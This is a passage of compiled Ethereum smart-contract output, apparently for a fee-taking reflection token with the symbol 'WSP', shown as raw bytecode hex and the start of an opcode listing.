ffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b610cc46117c9565b73ffffffffffffffffffffffffffffffffffffffff16610ce2610ed1565b73ffffffffffffffffffffffffffffffffffffffff161480610d585750610d076117c9565b73ffffffffffffffffffffffffffffffffffffffff16600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b610d97576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d8e906131c0565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fa64373a629bc0c09eacf8a9cc2c7b070fa0a8b7e2e9b8aaee408a3c02eb1676b60405160405180910390a380600f60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160056000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60606040518060400160405280600381526020017f5753500000000000000000000000000000000000000000000000000000000000815250905090565b610f3f6117c9565b73ffffffffffffffffffffffffffffffffffffffff16610f5d610ed1565b73ffffffffffffffffffffffffffffffffffffffff161480610fd35750610f826117c9565b73ffffffffffffffffffffffffffffffffffffffff16600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b611012576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611009906131c0565b60405180910390fd5b600b8410611055576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161104c90613298565b60405180910390fd5b600b8310611098576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161108f90613298565b60405180910390fd5b600782106110db576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110d290613304565b60405180910390fd5b6007811061111e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161111590613304565b60405180910390fd5b8360088190555082600a819055508160098190555080600b8190555050505050565b600061115461114d6117c9565b848461199a565b6001905092915050565b6111666117c9565b73ffffffffffffffffffffffffffffffffffffffff16611184610ed1565b73ffffffffffffffffffffffffffffffffffffffff1614806111fa57506111a96117c9565b73ffffffffffffffffffffffffffffffffffffffff16600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b611239576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611230906131c0565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167ffbbc329437e8c79f847e170730ad6dd04106b7511cad70d06d635886d92de83c60405160405180910390a380600e60016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160056000600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166113b46117c9565b73ffffffffffffffffffffffffffffffffffffffff16148061142a5750600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166114126117c9565b73ffffffffffffffffffffffffffffffffffffffff16145b8061146e5750611438610ed1565b73ffffffffffffffffffffffffffffffffffffffff166114566117c9565b73ffffffffffffffffffffffffffffffffffffffff16145b61147757600080fd5b600061148230610b18565b905061148d816120de565b50565b6114986117c9565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611525576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161151c9061322c565b60405180910390fd5b60005b838390508110156115c457816005600086868581811061154b5761154a613324565b5b90506020020160208101906115609190612dba565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555080806115bc90613382565b915050611528565b50505050565b601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b61167f6117c9565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461170c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016117039061322c565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603611840576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118379061343c565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036118af576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118a6906134ce565b60405180910390fd5b80600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258360405161198d9190612c56565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603611a09576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611a0090613030565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603611a78576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611a6f906130c2565b60405180910390fd5b60008111611abb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611ab290613154565b60405180910390fd5b611ac3610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614158015611b315750611b01610ed1565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b15611ef1576000611b48611b43610ed1565b610b18565b905060148054906101000a900460ff16158015611bb35750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b8015611bcb5750601460159054906101000a900460ff165b8015611bd75750600081115b15611bff57611be5816120de565b60004790506000811115611bfd57611bfc47611f75565b5b505b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16148015611caa5750601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b15611cc257600854600c81905550600954600d819055505b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16148015611d6d5750601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b15611d8557600a54600c81905550600b54600d819055505b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1680611e265750600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b80611ed95750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015611ed85750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b5b15611eef576000600c819055506000600d819055505b505b611efc838383611f65565b505050565b6000838311158290611f49576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611f409190612a97565b60405180910390fd5b5060008385611f5891906134ee565b9050809150509392505050565b611f7083838361235c565b505050565b600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc611fc560028461252790919063ffffffff16565b9081150290604051600060405180830381858888f19350505050158015611ff0573d6000803e3d6000fd5b50600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc61204160028461252790919063ffffffff16565b9081150290604051600060405180830381858888f1935050505015801561206c573d6000803e3d6000fd5b5050565b60006006548211156120b7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016120ae90613594565b60405180910390fd5b60006120c1612571565b90506120d6818461252790919063ffffffff16565b915050919050565b60016014806101000a81548160ff0219169083151502179055506000600267ffffffffffffffff811115612115576121146135b4565b5b6040519080825280602002602001820160405280156121435781602001602082028036833780820191505090505b509050308160008151811061215b5761215a613324565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015612202573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061222691906135f8565b8160018151811061223a57612239613324565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250506122a861227f610ed1565b601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846117d1565b601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b815260040161230c95949392919061371e565b600060405180830381600087803b15801561232657600080fd5b505af115801561233a573d6000803e3d6000fd5b505050505060006014806101000a81548160ff02191690831515021790555050565b60008060008060008061236e8761259c565b9550955095509550955095506123cc86600260008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461260490919063ffffffff16565b600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061246185600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461264e90919063ffffffff16565b600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506124ad816126ac565b6124b78483612769565b8773ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040516125149190612c56565b60405180910390a3505050505050505050565b600061256983836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506127a3565b905092915050565b600080600061257e612806565b91509150612595818361252790919063ffffffff16565b9250505090565b60008060008060008060008060006125b98a600c54600d54612865565b92509250925060006125c9612571565b905060008060006125dc8e8787876128fb565b9250925092508282828989899c509c509c509c509c509c505050505050505091939550919395565b600061264683836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611f01565b905092915050565b600080828461265d9190613778565b9050838110156126a2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016126999061381a565b60405180910390fd5b8091505092915050565b60006126b6612571565b905060006126cd828461298490919063ffffffff16565b905061272181600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461264e90919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b61277e8260065461260490919063ffffffff16565b6006819055506127998160075461264e90919063ffffffff16565b6007819055505050565b600080831182906127ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016127e19190612a97565b60405180910390fd5b50600083856127f99190613869565b9050809150509392505050565b600080600060065490506000670de0b6b3a7640000905061283a670de0b6b3a764000060065461252790919063ffffffff16565b82101561285857600654670de0b6b3a7640000935093505050612861565b81819350935050505b9091565b6000806000806128916064612883888a61298490919063ffffffff16565b61252790919063ffffffff16565b905060006128bb60646128ad888b61298490919063ffffffff16565b61252790919063ffffffff16565b905060006128e4826128d6858c61260490919063ffffffff16565b61260490919063ffffffff16565b905080838395509550955050505093509350939050565b600080600080612914858961298490919063ffffffff16565b9050600061292b868961298490919063ffffffff16565b90506000612942878961298490919063ffffffff16565b9050600061296b8261295d858761260490919063ffffffff16565b61260490919063ffffffff16565b9050838184965096509650505050509450945094915050565b600080830361299657600090506129f8565b600082846129a4919061389a565b90508284826129b39190613869565b146129f3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016129ea90613966565b60405180910390fd5b809150505b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015612a38578082015181840152602081019050612a1d565b83811115612a47576000848401525b50505050565b6000601f19601f8301169050919050565b6000612a69826129fe565b612a738185612a09565b9350612a83818560208601612a1a565b612a8c81612a4d565b840191505092915050565b60006020820190508181036000830152612ab18184612a5e565b905092915050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000612aee82612ac3565b9050919050565b612afe81612ae3565b8114612b0957600080fd5b50565b600081359050612b1b81612af5565b92915050565b6000819050919050565b612b3481612b21565b8114612b3f57600080fd5b50565b600081359050612b5181612b2b565b92915050565b60008060408385031215612b6e57612b6d612ab9565b5b6000612b7c85828601612b0c565b9250506020612b8d85828601612b42565b9150509250929050565b60008115159050919050565b612bac81612b97565b82525050565b6000602082019050612bc76000830184612ba3565b92915050565b6000819050919050565b6000612bf2612bed612be884612ac3565b612bcd565b612ac3565b9050919050565b6000612c0482612bd7565b9050919050565b6000612c1682612bf9565b9050919050565b612c2681612c0b565b82525050565b6000602082019050612c416000830184612c1d565b92915050565b612c5081612b21565b82525050565b6000602082019050612c6b6000830184612c47565b92915050565b600080600060608486031215612c8a57612c89612ab9565b5b6000612c9886828701612b0c565b9350506020612ca986828701612b0c565b9250506040612cba86828701612b42565b9150509250925092565b600060ff82169050919050565b612cda81612cc4565b82525050565b6000602082019050612cf56000830184612cd1565b92915050565b612d0481612ae3565b82525050565b6000602082019050612d1f6000830184612cfb565b92915050565b6000612d3082612bf9565b9050919050565b612d4081612d25565b82525050565b6000602082019050612d5b6000830184612d37565b92915050565b612d6a81612b97565b8114612d7557600080fd5b50565b600081359050612d8781612d61565b92915050565b600060208284031215612da357612da2612ab9565b5b6000612db184828501612d78565b91505092915050565b600060208284031215612dd057612dcf612ab9565b5b6000612dde84828501612b0c565b91505092915050565b6000612df282612ac3565b9050919050565b612e0281612de7565b8114612e0d57600080fd5b50565b600081359050612e1f81612df9565b92915050565b600060208284031215612e3b57612e3a612ab9565b5b6000612e4984828501612e10565b91505092915050565b60008060008060808587031215612e6c57612e6b612ab9565b5b6000612e7a87828801612b42565b9450506020612e8b87828801612b42565b9350506040612e9c87828801612b42565b9250506060612ead87828801612b42565b91505092959194509250565b600080fd5b600080fd5b600080fd5b60008083601f840112612ede57612edd612eb9565b5b8235905067ffffffffffffffff811115612efb57612efa612ebe565b5b602083019150836020820283011115612f1757612f16612ec3565b5b9250929050565b600080600060408486031215612f3757612f36612ab9565b5b600084013567ffffffffffffffff811115612f5557612f54612abe565b5b612f6186828701612ec8565b93509350506020612f7486828701612d78565b9150509250925092565b60008060408385031215612f9557612f94612ab9565b5b6000612fa385828601612b0c565b9250506020612fb485828601612b0c565b9150509250929050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b600061301a602583612a09565b915061302582612fbe565b604082019050919050565b600060208201905081810360008301526130498161300d565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b60006130ac602383612a09565b91506130b782613050565b604082019050919050565b600060208201905081810360008301526130db8161309f565b9050919050565b7f5472616e7366657220616d6f756e74206d75737420626520677265617465722060008201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b600061313e602983612a09565b9150613149826130e2565b604082019050919050565b6000602082019050818103600083015261316d81613131565b9050919050565b7f43616c6c6572206973206e6f7420746865206465760000000000000000000000600082015250565b60006131aa601583612a09565b91506131b582613174565b602082019050919050565b600060208201905081810360008301526131d98161319d565b9050919050565b7f43616c6c6572206973206e6f7420746865206f776e6572000000000000000000600082015250565b6000613216601783612a09565b9150613221826131e0565b602082019050919050565b6000602082019050818103600083015261324581613209565b9050919050565b7f52656469732063616e6e6f74206265206d6f7265207468616e2031302e000000600082015250565b6000613282601d83612a09565b915061328d8261324c565b602082019050919050565b600060208201905081810360008301526132b181613275565b9050919050565b7f5461782063616e6e6f74206265206d6f7265207468616e20362e000000000000600082015250565b60006132ee601a83612a09565b91506132f9826132b8565b602082019050919050565b6000602082019050818103600083015261331d816132e1565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061338d82612b21565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036133bf576133be613353565b5b600182019050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000613426602483612a09565b9150613431826133ca565b604082019050919050565b6000602082019050818103600083015261345581613419565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b60006134b8602283612a09565b91506134c38261345c565b604082019050919050565b600060208201905081810360008301526134e7816134ab565b9050919050565b60006134f982612b21565b915061350483612b21565b92508282101561351757613516613353565b5b828203905092915050565b7f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260008201527f65666c656374696f6e7300000000000000000000000000000000000000000000602082015250565b600061357e602a83612a09565b915061358982613522565b604082019050919050565b600060208201905081810360008301526135ad81613571565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000815190506135f281612af5565b92915050565b60006020828403121561360e5761360d612ab9565b5b600061361c848285016135e3565b91505092915050565b6000819050919050565b600061364a61364561364084613625565b612bcd565b612b21565b9050919050565b61365a8161362f565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b61369581612ae3565b82525050565b60006136a7838361368c565b60208301905092915050565b6000602082019050919050565b60006136cb82613660565b6136d5818561366b565b93506136e08361367c565b8060005b838110156137115781516136f8888261369b565b9750613703836136b3565b9250506001810190506136e4565b5085935050505092915050565b600060a0820190506137336000830188612c47565b6137406020830187613651565b818103604083015261375281866136c0565b90506137616060830185612cfb565b61376e6080830184612c47565b9695505050505050565b600061378382612b21565b915061378e83612b21565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156137c3576137c2613353565b5b828201905092915050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b6000613804601b83612a09565b915061380f826137ce565b602082019050919050565b60006020820190508181036000830152613833816137f7565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061387482612b21565b915061387f83612b21565b92508261388f5761388e61383a565b5b828204905092915050565b60006138a582612b21565b91506138b083612b21565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff04831182151516156138e9576138e8613353565b5b828202905092915050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000613950602183612a09565b915061395b826138f4565b604082019050919050565b6000602082019050818103600083015261397f81613943565b905091905056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220b3f42b2ed8ca7e3cd68cea8125712e8ad8930174cf484fa5044602aa4eb068e464736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH5 0x14F46B0400 PUSH3 0x1F SWAP2 SWAP1 PUSH3 0x74C JUMP JUMPDEST PUSH5 0x14F46B0400 PUSH3 0x31 SWAP2 SWAP1 PUSH3 0x7B3 JUMP JUMPDEST PUSH1 0x6 SSTORE PUSH1 0x1 PUSH1 0x8 SSTORE PUSH1 0x4 PUSH1 0x9 SSTORE PUSH1 0x1 PUSH1 0xA SSTORE PUSH1 0x1 PUSH1 0xB SSTORE PUSH1 0x0 PUSH1 0xE PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH20 0x8492CBD894686D7E98214541903C7BA6F94928D6 PUSH1 0xE PUSH1 0x1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xA4ED7AA4EF5DEB0A63E97D9CB77445AE553FEB1D PUSH1 0xF PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xE061915592536656A92B9FD59E46B19EF920692F PUSH1 0x10 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x14 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x14 PUSH1 0x15 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH3 0x1A4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 PUSH3 0x1B7 PUSH3 0x6E2 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP PUSH1 0x6 SLOAD PUSH1 0x2 PUSH1 0x0 PUSH3 0x26C PUSH3 0x6E2 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH20 0x9AC64CC6E4415144C455BD8E4837FEA55603E5C3 SWAP1 POP DUP1 PUSH1 0x11 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC45A0155 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x350 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x376 SWAP2 SWAP1 PUSH3 0x858 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC9C65396 ADDRESS DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xAD5C4648 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x3DE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x404 SWAP2 SWAP1 PUSH3 0x858 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x423 SWAP3 SWAP2 SWAP1 PUSH3 0x89B JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x443 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x469 SWAP2 SWAP1 PUSH3 0x858 JUMP JUMPDEST PUSH1 0x14 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 PUSH3 0x4BF PUSH3 0x6EA PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 